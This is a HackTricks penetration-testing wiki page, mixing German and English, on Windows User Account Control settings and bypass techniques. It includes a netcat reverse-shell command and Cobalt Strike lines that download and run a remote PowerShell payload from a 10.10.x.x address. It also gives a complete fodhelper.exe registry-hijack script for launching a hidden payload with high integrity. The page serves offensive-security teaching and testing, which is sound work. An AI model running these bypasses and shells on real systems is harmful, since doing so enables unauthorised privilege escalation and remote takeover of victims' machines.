# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Level, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die das System **potenziell kompromittieren könnten**. Wenn UAC aktiviert ist, laufen Anwendungen und Tasks immer **im Sicherheitskontext eines Nicht-Administrator-Kontos**, es sei denn, ein Administrator gewährt diesen Anwendungen/Tasks explizit Administratorrechte, damit sie ausgeführt werden können. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze gilt.

Für mehr Infos über integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiviert ist, erhält ein Administrator-Benutzer 2 Tokens: ein Standardbenutzer-Token, um reguläre Aktionen auf normalem Level durchzuführen, und eines mit Administrator-Privilegien.

Diese [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) beschreibt sehr ausführlich, wie UAC funktioniert, einschließlich des Logon-Prozesses, der Benutzererfahrung und der UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC in ihrer Organisation lokal (mit secpol.msc) funktioniert oder über Group Policy Objects (GPO) in einer Active Directory-Domänenumgebung konfiguriert und verteilt werden. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Es gibt 10 Group Policy-Einstellungen, die für UAC gesetzt werden können. Die folgende Tabelle bietet zusätzliche Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                     | Registrierungsschlüssel     | Standardeinstellung                                          |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Zustimmung für Nicht-Windows-Binärdateien anfordern          |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Anmeldeinformationen auf dem sicheren Desktop anfordern      |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                     |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### UAC überprüfen

Um zu bestätigen, ob UAC aktiviert ist, führe aus:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, ist es **`0`** oder **existiert es nicht**, dann ist UAC **inaktiv**.

Prüfe dann **welches Level** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Dann musst du dir den Wert von **`LocalAccountTokenFilterPolicy`** ansehen\
Wenn der Wert **`0`**, dann kann nur der **RID 500** Benutzer (**built-in Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn er `1` ist, können **alle Konten in der Gruppe "Administrators"** dies tun.

Und schließlich sieh dir den Wert des Schlüssels **`FilterAdministratorToken`** an\
Wenn **`0`** (Standard), kann das **built-in Administrator-Konto** Remote-Administrationsaufgaben durchführen, und wenn **`1`**, kann das built-in Administrator-Konto **keine** Remote-Administrationsaufgaben durchführen, es sei denn `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All diese Informationen können mit dem **metasploit** Modul: `post/windows/gather/win_privs` ermittelt werden

Du kannst außerdem die Gruppen deines Benutzers prüfen und die Integritätsstufe (Integrity Level) ermitteln:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Beachten Sie, dass wenn Sie grafischen Zugriff auf das Opfer haben, ein UAC bypass sehr einfach ist, da Sie bei der UAC-Abfrage einfach auf "Yes" klicken können

Der UAC bypass wird in folgender Situation benötigt: **die UAC ist aktiviert, Ihr Prozess läuft in einem medium integrity context, und Ihr Benutzer gehört zur administrators group**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, die UAC zu umgehen, wenn sie auf der höchsten Sicherheitseinstellung (Always) steht, als wenn sie auf einer der anderen Einstellungen (Default) steht.**

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**) können Sie **eine reverse shell mit admin privileges** (high integrity level) ausführen, z. B. mit:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** einfache UAC "bypass" (voller Zugriff auf das Dateisystem)

Wenn du eine shell mit einem Benutzer hast, der zur Administrators group gehört, kannst du das über SMB freigegebene **C$** lokal als neues Laufwerk mounten und hast damit **Zugriff auf alles im Dateisystem** (sogar auf den Administrator home folder).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit Cobalt Strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf dem maximalen Sicherheitsniveau eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben ebenfalls mehrere Module, um die **UAC** zu **bypassen**.

### KRBUACBypass

Dokumentation und Tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), welches eine **Sammlung** mehrerer UAC bypass exploits ist. Beachte, dass du **UACME mit visual studio oder msbuild kompilieren musst**. Die Kompilierung erzeugt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`), du musst wissen **welche du brauchst.**\ Du solltest **vorsichtig sein**, weil einige bypasses **andere Programme auffordern** werden, die den **Benutzer** **warnen**, dass etwas passiert.

UACME enthält die **Build-Version, ab der jede Technik zu funktionieren begann**. Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird unter modernen Windows-Versionen automatisch erhöht. Beim Start fragt sie den per-User-Registrypfad unten ab, ohne das `DelegateExecute`-Verb zu validieren. Dort einen Befehl zu platzieren ermöglicht es einem Medium Integrity process (user is in Administrators), einen High Integrity process ohne UAC prompt zu starten.

Vom `fodhelper.exe` abgefragter Registrypfad:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell-Schritte (setze deine payload, dann löse sie aus):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administrators ist und das UAC-Level auf default/lenient eingestellt ist (nicht Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative`-Pfad, um von einem 32-Bit-Prozess auf einem 64-Bit-Windows eine 64-Bit PowerShell zu starten.
- Die Payload kann jeder Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide auffordernde UIs für mehr Stealth.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (prüfe, dass es beim Ausführen in einem High-Integrity-Level läuft).
2. Mit procmon **"NAME NOT FOUND"**-Events finden, die für **DLL Hijacking** anfällig sein können.
3. Du wirst wahrscheinlich die DLL in geschützte Pfade schreiben müssen (z. B. C:\Windows\System32), in denen du keine Schreibberechtigung hast. Das kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (weil dieses Tool mit High-Integrity-Level ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Erstelle ein **script**, das deine DLL in den geschützten Pfad kopiert und das verwundbare, autoelevated Binary ausführt.

### Another UAC bypass technique

Besteht darin zu beobachten, ob ein **autoElevated binary** versucht, aus der **registry** den **name/path** eines **binary** oder **command** auszulesen, das ausgeführt werden soll (das ist besonders interessant, wenn das Binary diese Informationen in der **HKCU** sucht).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
